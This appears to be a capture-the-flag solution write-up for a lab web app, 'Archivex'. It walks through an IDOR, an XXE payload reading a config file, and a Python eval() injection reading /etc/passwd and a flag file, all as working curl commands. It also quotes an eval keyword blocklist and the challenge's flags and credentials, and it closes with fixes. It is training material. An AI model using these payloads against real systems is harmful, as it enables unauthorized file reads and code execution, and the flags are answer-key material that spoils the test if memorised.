# Archivex — SOLUTION (spoilers!)

## Overview

Three-flag chain across three distinct vulnerability classes:
**IDOR → XXE file read → Python eval() code injection**

Each flag requires a different endpoint and a different technique.

---

## Flag 1: IDOR (Insecure Direct Object Reference)

### Discovery

The main page loads documents via `fetch('/api/docs')`. The JSON response:

```json
{
  "docs": [... 3 documents ...],
  "total": 5,
  "showing": 3
}
```

`total: 5` but only 3 shown → 2 restricted documents are hidden.

### Exploitation

The detail endpoint `/api/docs/<id>` has **no authorization check**:

```bash
curl http://localhost:8095/api/docs/4
```

Returns restricted document 4 containing:
- **Flag 1:** `FLAG{1d0r_br0k3n_4cc3ss_c0ntr0l}`
- Service account: `svc-import` / `BulkUpload!2026`
- Import endpoint: `POST /api/import`
- XML format: `<records><record><title>…</title><body>…</body></record></records>`

Also check `/api/docs/5` — it mentions the admin calculator and the config
file location (`/app/config.ini`).

---

## Flag 2: XXE (XML External Entity Injection)

### Setup

Log in with the service account from flag 1:

```bash
curl -s -c jar http://localhost:8095/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"svc-import","password":"BulkUpload!2026"}'
```

### Exploitation

The import endpoint parses XML with `lxml` using
`XMLParser(load_dtd=True, resolve_entities=True)` — external entities are
resolved.

```bash
curl -s -b jar http://localhost:8095/api/import \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///app/config.ini">
]>
<records>
  <record>
    <title>&xxe;</title>
    <body>test</body>
  </record>
</records>'
```

The title field in the response contains the config:

```ini
[archivex]
app_name = Archivex
admin_password = <random hex>
flag2 = FLAG{xxe_f1l3_r34d_c0nf1g_3xf1l}
db_path = /tmp/archivex.db
```

- **Flag 2:** `FLAG{xxe_f1l3_r34d_c0nf1g_3xf1l}`
- Admin password needed for flag 3.

---

## Flag 3: Python Code Injection (eval)

### Setup

Log in as admin with the password from the config:

```bash
curl -s -c jar http://localhost:8095/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<password from config>"}'
```

### Discovery

The admin panel at `/admin` has a "Metric Calculator." The backend uses
Python's `eval()` with a keyword blocklist:

```
import, os, system, subprocess, exec, compile, eval, __builtins__, globals, locals
```

### Exploitation

The blocklist doesn't include `open` or `read`:

```bash
curl -s -b jar http://localhost:8095/api/calc \
  -H 'Content-Type: application/json' \
  -d '{"expression":"open(\"/flag3.txt\").read()"}'
```

**Flag 3:** `FLAG{pyth0n_3v4l_c0d3_1nj3ct10n}`

Prove the primitive first with `/etc/passwd`:

```bash
curl -s -b jar http://localhost:8095/api/calc \
  -H 'Content-Type: application/json' \
  -d '{"expression":"open(\"/etc/passwd\").read()"}'
```

---

## Fixes

1. **IDOR**: Check authorization on `/api/docs/<id>` — verify the requesting
   user has permission to view restricted documents.
2. **XXE**: Use `defusedxml` or `etree.XMLParser(resolve_entities=False)`.
   Never enable DTD loading for user-supplied XML.
3. **eval()**: Never use `eval()` on user input. Use `ast.literal_eval()` for
   safe literal parsing, or a purpose-built math expression evaluator.
   Blocklists are inherently incomplete.
